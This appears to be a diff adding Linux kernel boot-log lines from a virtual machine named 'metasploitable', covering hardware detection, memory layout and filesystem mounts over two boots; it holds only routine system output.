+Sep  2 16:27:54 metasploitable kernel: [   10.717136]   PREFETCH window: ddf00000-ddffffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717141] PCI: Bridge: 0000:00:18.7
+Sep  2 16:27:54 metasploitable kernel: [   10.717146]   IO window: disabled.
+Sep  2 16:27:54 metasploitable kernel: [   10.717150]   MEM window: ed500000-ed5fffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717155]   PREFETCH window: ddb00000-ddbfffff
+Sep  2 16:27:54 metasploitable kernel: [   10.717377] NET: Registered protocol family 2
+Sep  2 16:27:54 metasploitable kernel: [   11.435101] IP route cache hash table entries: 32768 (order: 5, 131072 bytes)
+Sep  2 16:27:54 metasploitable kernel: [   11.438178] TCP established hash table entries: 131072 (order: 8, 1048576 bytes)
+Sep  2 16:27:54 metasploitable kernel: [   11.493877] TCP bind hash table entries: 65536 (order: 7, 524288 bytes)
+Sep  2 16:27:54 metasploitable kernel: [   11.537991] TCP: Hash tables configured (established 131072 bind 65536)
+Sep  2 16:27:54 metasploitable kernel: [   11.538031] TCP reno registered
+Sep  2 16:27:54 metasploitable kernel: [   11.634454] checking if image is initramfs... it is
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] Freeing initrd memory: 7743k freed
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] Simple Boot Flag at 0x36 set to 0x1
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] audit: initializing netlink socket (disabled)
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] audit(1788380833.113:1): initialized
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] highmem bounce pool size: 64 pages
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] Total HugeTLB memory allocated, 0
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] VFS: Disk quotas dquot_6.5.1
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] Dquot-cache hash table entries: 1024 (order 0, 4096 bytes)
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] io scheduler noop registered
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] io scheduler anticipatory registered
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] io scheduler deadline registered (default)
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] io scheduler cfq registered
+Sep  2 16:27:54 metasploitable kernel: [   12.677260] Limiting direct PCI/PCI transfers.
+Sep  2 16:27:54 metasploitable kernel: [   13.179674] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.184597] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.231065] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.236532] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.241650] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.279952] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.285004] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.289781] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.327804] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.332776] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.338108] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.342773] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.380738] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.385476] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.391121] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.430962] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.439561] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.481298] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.490970] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.533307] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.630806] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.641201] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.683676] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.726306] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.737788] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.779777] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.791720] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.833592] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.842300] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.884713] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.926839] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.936042] assign_interrupt_mode Found MSI capability
+Sep  2 16:27:54 metasploitable kernel: [   13.980052] isapnp: Scanning for PnP cards...
+Sep  2 16:27:54 metasploitable kernel: [   15.223280] isapnp: No Plug & Play device found
+Sep  2 16:27:54 metasploitable kernel: [   16.131642] Real Time Clock Driver v1.12ac
+Sep  2 16:27:54 metasploitable kernel: [   16.132623] Serial: 8250/16550 driver $Revision: 1.90 $ 4 ports, IRQ sharing enabled
+Sep  2 16:27:54 metasploitable kernel: [   16.133951] serial8250: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
+Sep  2 16:27:54 metasploitable kernel: [   16.135189] serial8250: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
+Sep  2 16:27:54 metasploitable kernel: [   16.172864] 00:09: ttyS0 at I/O 0x3f8 (irq = 4) is a 16550A
+Sep  2 16:27:54 metasploitable kernel: [   16.174801] 00:0a: ttyS1 at I/O 0x2f8 (irq = 3) is a 16550A
+Sep  2 16:27:54 metasploitable kernel: [   16.184947] RAMDISK driver initialized: 16 RAM disks of 65536K size 1024 blocksize
+Sep  2 16:27:54 metasploitable kernel: [   16.185453] input: Macintosh mouse button emulation as /devices/virtual/input/input0
+Sep  2 16:27:54 metasploitable kernel: [   16.186494] PNP: PS/2 Controller [PNP0303:KBC,PNP0f13:MOUS] at 0x60,0x64 irq 1,12
+Sep  2 16:27:54 metasploitable kernel: [   16.222748] serio: i8042 KBD port at 0x60,0x64 irq 1
+Sep  2 16:27:54 metasploitable kernel: [   16.222821] serio: i8042 AUX port at 0x60,0x64 irq 12
+Sep  2 16:27:54 metasploitable kernel: [   16.281907] mice: PS/2 mouse device common for all mice
+Sep  2 16:27:54 metasploitable kernel: [   16.283747] EISA: Probing bus 0 at eisa.0
+Sep  2 16:27:54 metasploitable kernel: [   16.283824] Cannot allocate resource for EISA slot 1
+Sep  2 16:27:54 metasploitable kernel: [   16.283841] Cannot allocate resource for EISA slot 2
+Sep  2 16:27:54 metasploitable kernel: [   16.283856] Cannot allocate resource for EISA slot 3
+Sep  2 16:27:54 metasploitable kernel: [   16.283871] Cannot allocate resource for EISA slot 4
+Sep  2 16:27:54 metasploitable kernel: [   16.283887] Cannot allocate resource for EISA slot 5
+Sep  2 16:27:54 metasploitable kernel: [   16.283903] Cannot allocate resource for EISA slot 6
+Sep  2 16:27:54 metasploitable kernel: [   16.283918] Cannot allocate resource for EISA slot 7
+Sep  2 16:27:54 metasploitable kernel: [   16.283933] Cannot allocate resource for EISA slot 8
+Sep  2 16:27:54 metasploitable kernel: [   16.283948] EISA: Detected 0 cards.
+Sep  2 16:27:54 metasploitable kernel: [   16.283965] cpuidle: using governor ladder
+Sep  2 16:27:54 metasploitable kernel: [   16.283981] cpuidle: using governor menu
+Sep  2 16:27:54 metasploitable kernel: [   16.284070] NET: Registered protocol family 1
+Sep  2 16:27:54 metasploitable kernel: [   16.284110] Using IPI No-Shortcut mode
+Sep  2 16:27:54 metasploitable kernel: [   16.284151] registered taskstats version 1
+Sep  2 16:27:54 metasploitable kernel: [   16.284430]   Magic number: 10:217:497
+Sep  2 16:27:54 metasploitable kernel: [   16.284547] BIOS EDD facility v0.16 2004-Jun-25, 6 devices found
+Sep  2 16:27:54 metasploitable kernel: [   16.286794] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
+Sep  2 16:27:54 metasploitable kernel: [   16.321692] Freeing unused kernel memory: 384k freed
+Sep  2 16:27:54 metasploitable kernel: [   17.824883] fuse init (API version 7.9)
+Sep  2 16:27:54 metasploitable kernel: [   17.996181] device-mapper: uevent: version 1.0.3
+Sep  2 16:27:54 metasploitable kernel: [   17.996400] device-mapper: ioctl: 4.12.0-ioctl (2007-10-02) initialised: dm-devel@redhat.com
+Sep  2 16:27:54 metasploitable kernel: [   18.647904] SCSI subsystem initialized
+Sep  2 16:27:54 metasploitable kernel: [   18.735692] scsi0 : ata_piix
+Sep  2 16:27:54 metasploitable kernel: [   18.735953] scsi1 : ata_piix
+Sep  2 16:27:54 metasploitable kernel: [   18.736010] ata1: PATA max UDMA/33 cmd 0x1f0 ctl 0x3f6 bmdma 0x1060 irq 14
+Sep  2 16:27:54 metasploitable kernel: [   18.736025] ata2: PATA max UDMA/33 cmd 0x170 ctl 0x376 bmdma 0x1068 irq 15
+Sep  2 16:27:54 metasploitable kernel: [   19.086469] Fusion MPT base driver 3.04.06
+Sep  2 16:27:54 metasploitable kernel: [   19.086480] Copyright (c) 1999-2007 LSI Corporation
+Sep  2 16:27:54 metasploitable kernel: [   19.088897] Fusion MPT SPI Host driver 3.04.06
+Sep  2 16:27:54 metasploitable kernel: [   19.144380] usbcore: registered new interface driver usbfs
+Sep  2 16:27:54 metasploitable kernel: [   19.144403] usbcore: registered new interface driver hub
+Sep  2 16:27:54 metasploitable kernel: [   19.144823] usbcore: registered new device driver usb
+Sep  2 16:27:54 metasploitable kernel: [   19.146238] pcnet32.c:v1.34 14.Aug.2007 tsbogend@alpha.franken.de
+Sep  2 16:27:54 metasploitable kernel: [   19.147611] USB Universal Host Controller Interface driver v3.0
+Sep  2 16:27:54 metasploitable kernel: [   19.343852] ata2.00: ATAPI: VMware Virtual IDE CDROM Drive, 00000001, max UDMA/33
+Sep  2 16:27:54 metasploitable kernel: [   19.540398] ata2.00: configured for UDMA/33
+Sep  2 16:27:54 metasploitable kernel: [   19.541290] scsi 1:0:0:0: CD-ROM            NECVMWar VMware IDE CDR10 1.00 PQ: 0 ANSI: 5
+Sep  2 16:27:54 metasploitable kernel: [   19.541592] ACPI: PCI Interrupt 0000:02:01.0[A] -> GSI 19 (level, low) -> IRQ 16
+Sep  2 16:27:54 metasploitable kernel: [   19.541810] pcnet32: PCnet/PCI II 79C970A at 0x2000, 00 0c 29 0f a7 4f assigned IRQ 16.
+Sep  2 16:27:54 metasploitable kernel: [   19.542174] eth0: registered as PCnet/PCI II 79C970A
+Sep  2 16:27:54 metasploitable kernel: [   19.542360] ACPI: PCI Interrupt 0000:02:02.0[A] -> GSI 16 (level, low) -> IRQ 17
+Sep  2 16:27:54 metasploitable kernel: [   19.542540] pcnet32: PCnet/PCI II 79C970A at 0x2080,<6>ACPI: PCI Interrupt 0000:00:10.0[A] -> GSI 17 (level, low) -> IRQ 18
+Sep  2 16:27:54 metasploitable kernel: [   19.542602]  00 0c 29 0f a7 59<6>mptbase: ioc0: Initiating bringup
+Sep  2 16:27:54 metasploitable kernel: [   19.542684]  assigned IRQ 17.
+Sep  2 16:27:54 metasploitable kernel: [   19.542870] eth1: registered as PCnet/PCI II 79C970A
+Sep  2 16:27:54 metasploitable kernel: [   19.542923] pcnet32: 2 cards_found.
+Sep  2 16:27:54 metasploitable kernel: [   19.698022] Floppy drive(s): fd0 is 1.44M
+Sep  2 16:27:54 metasploitable kernel: [   19.743902] FDC 0 is a post-1991 82077
+Sep  2 16:27:54 metasploitable kernel: [   19.990152] ioc0: LSI53C1030 B0: Capabilities={Initiator}
+Sep  2 16:27:54 metasploitable kernel: [   20.788933] scsi2 : ioc0: LSI53C1030 B0, FwRev=01032920h, Ports=1, MaxQ=128, IRQ=18
+Sep  2 16:27:54 metasploitable kernel: [   21.487957] ACPI: PCI Interrupt 0000:02:03.0[A] -> GSI 17 (level, low) -> IRQ 18
+Sep  2 16:27:54 metasploitable kernel: [   21.488365] ehci_hcd 0000:02:03.0: EHCI Host Controller
+Sep  2 16:27:54 metasploitable kernel: [   21.488855] ehci_hcd 0000:02:03.0: new USB bus registered, assigned bus number 1
+Sep  2 16:27:54 metasploitable kernel: [   21.489813] ehci_hcd 0000:02:03.0: irq 18, io mem 0xef5ff000
+Sep  2 16:27:54 metasploitable kernel: [   21.490579] scsi 2:0:0:0: Direct-Access     VMware,  VMware Virtual S 1.0  PQ: 0 ANSI: 2
+Sep  2 16:27:54 metasploitable kernel: [   21.490624]  target2:0:0: Beginning Domain Validation
+Sep  2 16:27:54 metasploitable kernel: [   21.532474]  target2:0:0: Domain Validation skipping write tests
+Sep  2 16:27:54 metasploitable kernel: [   21.532504]  target2:0:0: Ending Domain Validation
+Sep  2 16:27:54 metasploitable kernel: [   21.532634]  target2:0:0: FAST-40 WIDE SCSI 80.0 MB/s ST (25 ns, offset 127)
+Sep  2 16:27:54 metasploitable kernel: [   21.542613] ehci_hcd 0000:02:03.0: USB 2.0 started, EHCI 1.00, driver 10 Dec 2004
+Sep  2 16:27:54 metasploitable kernel: [   21.542840] usb usb1: configuration #1 chosen from 1 choice
+Sep  2 16:27:54 metasploitable kernel: [   21.542904] hub 1-0:1.0: USB hub found
+Sep  2 16:27:54 metasploitable kernel: [   21.542937] hub 1-0:1.0: 6 ports detected
+Sep  2 16:27:54 metasploitable kernel: [   21.690719] ACPI: PCI Interrupt 0000:02:00.0[A] -> GSI 18 (level, low) -> IRQ 19
+Sep  2 16:27:54 metasploitable kernel: [   21.690916] uhci_hcd 0000:02:00.0: UHCI Host Controller
+Sep  2 16:27:54 metasploitable kernel: [   21.690992] uhci_hcd 0000:02:00.0: new USB bus registered, assigned bus number 2
+Sep  2 16:27:54 metasploitable kernel: [   21.691862] uhci_hcd 0000:02:00.0: irq 19, io base 0x00002400
+Sep  2 16:27:54 metasploitable kernel: [   21.692871] usb usb2: configuration #1 chosen from 1 choice
+Sep  2 16:27:54 metasploitable kernel: [   21.692942] hub 2-0:1.0: USB hub found
+Sep  2 16:27:54 metasploitable kernel: [   21.692978] hub 2-0:1.0: 2 ports detected
+Sep  2 16:27:54 metasploitable kernel: [   21.694369] Driver 'sd' needs updating - please use bus_type methods
+Sep  2 16:27:54 metasploitable kernel: [   21.730497] sd 2:0:0:0: [sda] 16777216 512-byte hardware sectors (8590 MB)
+Sep  2 16:27:54 metasploitable kernel: [   21.731267] sd 2:0:0:0: [sda] Write Protect is off
+Sep  2 16:27:54 metasploitable kernel: [   21.732158] sd 2:0:0:0: [sda] Cache data unavailable
+Sep  2 16:27:54 metasploitable kernel: [   21.737137] sd 2:0:0:0: [sda] 16777216 512-byte hardware sectors (8590 MB)
+Sep  2 16:27:54 metasploitable kernel: [   21.737716] sd 2:0:0:0: [sda] Write Protect is off
+Sep  2 16:27:54 metasploitable kernel: [   21.739241] sd 2:0:0:0: [sda] Cache data unavailable
+Sep  2 16:27:54 metasploitable kernel: [   21.743263]  sda: sda1 sda2 < sda5 >
+Sep  2 16:27:54 metasploitable kernel: [   21.790315] sd 2:0:0:0: [sda] Attached SCSI disk
+Sep  2 16:27:54 metasploitable kernel: [   21.831468] scsi 1:0:0:0: Attached scsi generic sg0 type 5
+Sep  2 16:27:54 metasploitable kernel: [   21.831579] sd 2:0:0:0: Attached scsi generic sg1 type 0
+Sep  2 16:27:54 metasploitable kernel: [   21.931203] Driver 'sr' needs updating - please use bus_type methods
+Sep  2 16:27:54 metasploitable kernel: [   21.988227] sr0: scsi3-mmc drive: 1x/1x writer dvd-ram cd/rw xa/form2 cdda tray
+Sep  2 16:27:54 metasploitable kernel: [   21.988249] Uniform CD-ROM driver Revision: 3.20
+Sep  2 16:27:54 metasploitable kernel: [   22.741361] Attempting manual resume
+Sep  2 16:27:54 metasploitable kernel: [   22.836262] kjournald starting.  Commit interval 5 seconds
+Sep  2 16:27:54 metasploitable kernel: [   22.836480] EXT3-fs: mounted filesystem with ordered data mode.
+Sep  2 16:27:54 metasploitable kernel: [   27.855726] piix4_smbus 0000:00:07.3: Found 0000:00:07.3 device
+Sep  2 16:27:54 metasploitable kernel: [   27.908302] pci_hotplug: PCI Hot Plug PCI Core version: 0.5
+Sep  2 16:27:54 metasploitable kernel: [   28.107559] shpchp: Standard Hot Plug PCI Controller Driver version: 0.4
+Sep  2 16:27:54 metasploitable kernel: [   28.207339] Linux agpgart interface v0.102
+Sep  2 16:27:54 metasploitable kernel: [   28.350467] agpgart: Detected an Intel 440BX Chipset.
+Sep  2 16:27:54 metasploitable kernel: [   28.396709] agpgart: AGP aperture is 256M @ 0x0
+Sep  2 16:27:54 metasploitable kernel: [   28.456560] input: Power Button (FF) as /devices/virtual/input/input2
+Sep  2 16:27:54 metasploitable kernel: [   28.653708] ACPI: Power Button (FF) [PWRF]
+Sep  2 16:27:54 metasploitable kernel: [   28.654872] ACPI: AC Adapter [ACAD] (on-line)
+Sep  2 16:27:54 metasploitable kernel: [   29.646938] eth0: link up
+Sep  2 16:27:54 metasploitable kernel: [   31.941146] input: PC Speaker as /devices/platform/pcspkr/input/input3
+Sep  2 16:27:54 metasploitable kernel: [   32.398131] input: ImPS/2 Generic Wheel Mouse as /devices/platform/i8042/serio1/input/input4
+Sep  2 16:27:54 metasploitable kernel: [   33.450596] parport_pc 00:08: reported by Plug and Play ACPI
+Sep  2 16:27:54 metasploitable kernel: [   33.451163] parport0: PC-style at 0x378, irq 7 [PCSPP,TRISTATE]
+Sep  2 16:27:54 metasploitable kernel: [   35.536588] NET: Registered protocol family 17
+Sep  2 16:27:54 metasploitable kernel: [   37.363677] loop: module loaded
+Sep  2 16:27:54 metasploitable kernel: [   37.388016] lp0: using parport0 (interrupt-driven).
+Sep  2 16:27:54 metasploitable kernel: [   50.230972] EXT3 FS on dm-0, internal journal
+Sep  2 16:27:54 metasploitable kernel: [   50.427066] NET: Registered protocol family 10
+Sep  2 16:27:54 metasploitable kernel: [   50.427417] lo: Disabled Privacy Extensions
+Sep  2 16:27:54 metasploitable kernel: [   51.517549] kjournald starting.  Commit interval 5 seconds
+Sep  2 16:27:54 metasploitable kernel: [   51.518155] EXT3 FS on sda1, internal journal
+Sep  2 16:27:54 metasploitable kernel: [   51.518160] EXT3-fs: mounted filesystem with ordered data mode.
+Sep  2 16:27:54 metasploitable kernel: [   51.939078] ip_tables: (C) 2000-2006 Netfilter Core Team
+Sep  2 16:27:54 metasploitable kernel: [   53.405304] RPC: Registered udp transport module.
+Sep  2 16:27:54 metasploitable kernel: [   53.405310] RPC: Registered tcp transport module.
+Sep  2 16:28:04 metasploitable kernel: [   64.081954] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
+Sep  2 16:28:04 metasploitable kernel: [   64.205184] NFSD: Using /var/lib/nfs/v4recovery as the NFSv4 state recovery directory
+Sep  2 16:28:04 metasploitable kernel: [   64.205316] NFSD: starting 90-second grace period
+Sep 13 17:20:26 metasploitable syslogd 1.5.0#1ubuntu1: restart.
+Sep 13 17:20:26 metasploitable kernel: Inspecting /boot/System.map-2.6.24-16-server
+Sep 13 17:20:26 metasploitable kernel: Loaded 28738 symbols from /boot/System.map-2.6.24-16-server.
+Sep 13 17:20:26 metasploitable kernel: Symbols match kernel version 2.6.24.
+Sep 13 17:20:26 metasploitable kernel: Loaded 15781 symbols from 60 modules.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Initializing cgroup subsys cpuset
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Initializing cgroup subsys cpu
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008 (Ubuntu 2.6.24-16.30-server)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] BIOS-provided physical RAM map:
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000000000000 - 000000000009f800 (usable)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 000000000009f800 - 00000000000a0000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000000dc000 - 0000000000100000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000000100000 - 0000000044ae0000 (usable)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044ae0000 - 0000000044aff000 (ACPI data)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044aff000 - 0000000044b00000 (ACPI NVS)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 0000000044b00000 - 0000000044c00000 (usable)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000e0000000 - 00000000e8000000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fec00000 - 00000000fec10000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fee00000 - 00000000fee01000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]  BIOS-e820: 00000000fffe0000 - 0000000100000000 (reserved)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] 204MB HIGHMEM available.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] 896MB LOWMEM available.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] found SMP MP-table at 000f6a70
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] NX (Execute Disable) protection: active
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Zone PFN ranges:
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]   DMA             0 ->     4096
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]   Normal       4096 ->   229376
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]   HighMem    229376 ->   281600
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Movable zone start PFN for each node
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] early_node_map[1] active PFN ranges
+Sep 13 17:20:26 metasploitable kernel: [    0.000000]     0:        0 ->   281600
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] DMI present.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: RSDP signature @ 0xC00F6A00 checksum 0
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: RSDP 000F6A00, 0024 (r2 PTLTD )
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: XSDT 44AEEA7B, 0054 (r1 INTEL  440BX     6040000 VMW   1324272)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: FACP 44AFEE73, 00F4 (r4 INTEL  440BX     6040000 PTL     F4240)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: DSDT 44AEEC95, 101DE (r1 PTLTD  Custom    6040000 MSFT  3000001)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: FACS 44AFFFC0, 0040
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: BOOT 44AEEC6D, 0028 (r1 PTLTD  $SBFTBL$  6040000  LTP        1)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: APIC 44AEEC0F, 005E (r1 PTLTD  ^I APIC    6040000  LTP        0)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: MCFG 44AEEBD3, 003C (r1 PTLTD  $PCITBL$  6040000  LTP        1)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: SRAT 44AEEB33, 00A0 (r2 VMWARE MEMPLUG   6040000 VMW         1)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: WAET 44AEEB0B, 0028 (r1 VMWARE VMW WAET  6040000 VMW         1)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: PM-Timer IO Port: 0x1008
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: LAPIC (acpi_id[0x00] lapic_id[0x00] enabled)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Processor #0 14:14 APIC version 17
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: LAPIC (acpi_id[0x01] lapic_id[0x01] enabled)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Processor #1 14:14 APIC version 17
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x00] high edge lint[0x1])
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x01] high edge lint[0x1])
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: IOAPIC (id[0x02] address[0xfec00000] gsi_base[0])
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] IOAPIC[0]: apic_id 2, version 17, address 0xfec00000, GSI 0-23
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 high edge)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Enabling APIC mode:  Flat.  Using 1 I/O APICs
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Using ACPI (MADT) for SMP configuration information
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Allocating PCI resources starting at 50000000 (gap: 44c00000:9b400000)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 000000000009f000 - 00000000000a0000
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 00000000000a0000 - 00000000000dc000
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] swsusp: Registered nosave memory region: 00000000000dc000 - 0000000000100000
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Built 1 zonelists in Zone order, mobility grouping on.  Total pages: 279400
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Kernel command line: root=/dev/mapper/metasploitable-root ro quiet splash
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Enabling fast FPU save and restore... done.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Enabling unmasked SIMD FPU exception support... done.
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Initializing CPU#0
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] PID hash table entries: 4096 (order: 12, 16384 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    0.000000] Detected 2111.206 MHz processor.
+Sep 13 17:20:26 metasploitable kernel: [    7.992007] Console: colour VGA+ 80x25
+Sep 13 17:20:26 metasploitable kernel: [    7.992034] console [tty0] enabled
+Sep 13 17:20:26 metasploitable kernel: [    7.992892] Dentry cache hash table entries: 131072 (order: 7, 524288 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    7.993751] Inode-cache hash table entries: 65536 (order: 6, 262144 bytes)
+Sep 13 17:20:26 metasploitable kernel: [    7.994609] Memory: 1103784k/1126400k available (2255k kernel code, 21676k reserved, 1032k data, 384k init, 208768k highmem)
+Sep 13 17:20:26 metasploitable kernel: [    7.994664] virtual kernel memory layout:
+Sep 13 17:20:26 metasploitable kernel: [    7.994685]     fixmap  : 0xfff4c000 - 0xfffff000   ( 716 kB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994706]     pkmap   : 0xffc00000 - 0xffe00000   (2048 kB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994727]     vmalloc : 0xf8800000 - 0xffbfe000   ( 115 MB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994748]     lowmem  : 0xc0000000 - 0xf8000000   ( 896 MB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994769]       .init : 0xc043c000 - 0xc049c000   ( 384 kB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994790]       .data : 0xc0333e95 - 0xc0435fe4   (1032 kB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994811]       .text : 0xc0100000 - 0xc0333e95   (2255 kB)
+Sep 13 17:20:26 metasploitable kernel: [    7.994835] Checking if this processor honours the WP bit even in supervisor mode... Ok.
+Sep 13 17:20:26 metasploitable kernel: [    7.995082] SLUB: Genslabs=11, HWalign=64, Order=0-1, MinObjects=4, CPUs=2, Nodes=1
+Sep 13 17:20:26 metasploitable kernel: [    8.145428] Calibrating delay using timer specific routine.. 4325.51 BogoMIPS (lpj=21627551)
+Sep 13 17:20:26 metasploitable kernel: [    8.145585] Security Framework initialized
+Sep 13 17:20:26 metasploitable kernel: [    8.145612] SELinux:  Disabled at boot.
+Sep 13 17:20:26 metasploitable kernel: [    8.145728] AppArmor: AppArmor initialized
+Sep 13 17:20:26 metasploitable kernel: [    8.145753] Failure registering capabilities with primary security module.
+Sep 13 17:20:26 metasploitable kernel: [    8.145781] Mount-cache hash table entries: 512
+Sep 13 17:20:26 metasploitable kernel: [    8.145937] Initializing cgroup subsys ns
+Sep 13 17:20:26 metasploitable kernel: [    8.145969] Initializing cgroup subsys cpuacct
+Sep 13 17:20:26 metasploitable kernel: [    8.146277] CPU: L1 I cache: 32K, L1 D cache: 32K
